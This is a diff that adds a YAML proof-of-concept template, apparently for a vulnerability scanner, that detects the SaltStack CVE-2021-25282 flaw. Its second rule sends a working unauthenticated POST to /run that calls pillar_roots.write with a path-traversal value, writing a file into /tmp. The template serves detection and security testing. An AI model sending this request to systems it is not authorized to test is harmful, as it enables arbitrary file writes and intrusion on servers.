@@ -1,0 +1,30 @@
+detail:
+  author: jweny(https://github.com/jweny)
+  links:
+  - https://www.anquanke.com/post/id/232748
+expression: r0() && r1()
+manual: true
+name: poc-yaml-saltstack-cve-2021-25282-file-write
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.icontains("application/json")
+      && response.body.bcontains(b"wheel_async") && response.body.bcontains(b"runner_async")
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /run
+  r1:
+    expression: response.status == 200 && response.content_type.icontains("application/json")
+      && "salt/wheel/d*".bmatches(response.body)
+    request:
+      body: '{"eauth":"auto","client":"wheel_async","fun":"pillar_roots.write","data":"{{r1}}","path":"../../../../../../../../../tmp/{{r1}}"}'
+      cache: true
+      follow_redirects: false
+      headers:
+        Content-type: application/json
+      method: POST
+      path: /run
+set:
+  r1: randomLowercase(5)
+transport: http
